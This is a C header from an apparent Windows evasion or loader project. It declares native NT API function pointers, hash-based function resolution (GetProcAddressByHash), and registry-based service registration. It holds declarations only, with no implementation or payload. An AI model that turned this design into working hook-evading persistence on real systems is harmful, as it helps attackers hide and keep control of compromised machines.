#ifndef CAT_AND_MOUSE_LIBRARY_H
#define CAT_AND_MOUSE_LIBRARY_H

#include <windows.h>
#include <winternl.h>


typedef NTSTATUS (NTAPI *pNtOpenKey)(
    PHANDLE KeyHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS (NTAPI *pNtSetValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    ULONG TitleIndex,
    ULONG Type,
    PVOID Data,
    ULONG DataSize
);

typedef NTSTATUS (NTAPI *pNtClose)(
    HANDLE KeyHandle
);

typedef NTSTATUS (NTAPI *pNtCreateKey)(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PCUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _Out_opt_ PULONG Disposition
);


typedef NTSTATUS (NTAPI *pNtCreateFile)(
_Out_ PHANDLE FileHandle,
_In_ ACCESS_MASK DesiredAccess,
_In_ POBJECT_ATTRIBUTES ObjectAttributes,
_Out_ PIO_STATUS_BLOCK IoStatusBlock,
_In_opt_ PLARGE_INTEGER AllocationSize,
_In_ ULONG FileAttributes,
_In_ ULONG ShareAccess,
_In_ ULONG CreateDisposition,
_In_ ULONG CreateOptions,
_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
_In_ ULONG EaLength);

typedef NTSTATUS (NTAPI *pNtWriteFile)();

typedef NTSTATUS (NTAPI *pNtSetInformationFile)();

typedef NTSTATUS (NTAPI *pRtlDecompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);

typedef struct API_TABLE {
    pNtCreateKey NtCreateKey;
    pNtSetValueKey NtSetValueKey;
    pNtClose NtClose;
    pNtOpenKey NtOpenKey;
    pNtWriteFile NtWriteFile;
    pNtCreateFile NtCreateFile;
    pNtSetInformationFile NtSetInformationFile;
} API_TABLE, *PAPI_TABLE;

HMODULE GetLibraryBase(const wchar_t *);

void *GetProcAddressByHash(HMODULE hModule, const char *targetHash);

void ArchiveNativeAPIs(HMODULE hNtdll, API_TABLE *);

void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);

HANDLE CreateRegistryKey(PCWSTR path, API_TABLE *);

int RegisterService(API_TABLE *);

NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, unsigned long type, void *value, unsigned long dataSize,
                             API_TABLE *);

HANDLE CreateFileNt();
void WriteFileNt();


#endif // CAT_AND_MOUSE_LIBRARY_H
